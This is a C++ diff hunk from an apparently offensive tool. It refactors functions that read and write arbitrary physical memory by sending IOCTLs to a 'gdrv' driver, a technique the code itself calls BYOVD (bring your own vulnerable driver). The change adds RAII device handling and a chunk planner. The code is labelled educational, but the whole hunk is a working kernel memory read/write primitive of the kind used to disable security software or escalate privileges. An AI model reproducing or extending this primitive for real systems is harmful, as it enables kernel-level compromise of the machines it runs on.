@@ -183,28 +183,29 @@ Result<std::vector<std::uint8_t>> read_physical_via_gdrv(std::uint64_t phys_addr
   };
 
   for (const char* path : candidates) {
-    auto dev = open_device(path);
-    if (!dev) continue;
+    // Ledger E17: RAII device ownership — the handle closes on every exit
+    // path, and the chunk loop comes from the overflow-checked planner.
+    auto dev = ScopedDevice::open(path);
+    if (!dev.valid()) continue;
 
     const std::size_t chunk_cap = 512;  // educational driver caps at 512
+    const auto plan = plan_chunked_read(phys_addr, size, chunk_cap);
+    if (plan.empty() && size != 0) continue;
     std::vector<std::uint8_t> total;
     total.reserve(size);
-    std::size_t done = 0;
     bool ok = true;
-    while (done < size) {
-      const std::size_t chunk = (std::min)(size - done, chunk_cap);
-      PhysReq req{phys_addr + done, static_cast<std::uint32_t>(chunk), 0};
+    for (const ChunkPlan& part : plan) {
+      PhysReq req{part.address, static_cast<std::uint32_t>(part.size), 0};
       std::vector<std::uint8_t> in(sizeof(req));
       std::memcpy(in.data(), &req, sizeof(req));
-      auto out = send_ioctl(*dev, kPhysRead, in, chunk);
-      if (!out || out->size() < chunk) {
+      auto out = send_ioctl(dev.get(), kPhysRead, in, part.size);
+      if (!out || out->size() < part.size) {
         ok = false;
         break;
       }
-      total.insert(total.end(), out->begin(), out->begin() + static_cast<std::ptrdiff_t>(chunk));
-      done += chunk;
+      total.insert(total.end(), out->begin(),
+                   out->begin() + static_cast<std::ptrdiff_t>(part.size));
     }
-    (void)close_device(*dev);
     if (ok && total.size() == size) return total;
   }
 
@@ -224,25 +225,27 @@ Result<void> write_physical_via_gdrv(std::uint64_t phys_addr,
   };
 
   for (const char* path : candidates) {
-    auto dev = open_device(path);
-    if (!dev) continue;
+    auto dev = ScopedDevice::open(path);
+    if (!dev.valid()) continue;
 
+    const auto plan = plan_chunked_read(phys_addr, data.size(), 512);
+    if (plan.empty() && !data.empty()) continue;
     std::size_t done = 0;
     bool ok = true;
-    while (done < data.size()) {
-      const std::size_t chunk = (std::min)(data.size() - done, static_cast<std::size_t>(512));
-      PhysReq req{phys_addr + done, static_cast<std::uint32_t>(chunk), 0};
+    for (const ChunkPlan& part : plan) {
+      const std::size_t chunk = part.size;
+      (void)done;
+      PhysReq req{part.address, static_cast<std::uint32_t>(chunk), 0};
       std::vector<std::uint8_t> in(sizeof(req) + chunk);
       std::memcpy(in.data(), &req, sizeof(req));
       std::memcpy(in.data() + sizeof(req), data.data() + done, chunk);
-      auto out = send_ioctl(*dev, kPhysWrite, in, 0);
+      auto out = send_ioctl(dev.get(), kPhysWrite, in, 0);
       if (!out) {
         ok = false;
         break;
       }
       done += chunk;
     }
-    (void)close_device(*dev);
     if (ok) return Result<void>();
   }
   return Result<void>("No educational BYOVD device accepted PHYS_WRITE");
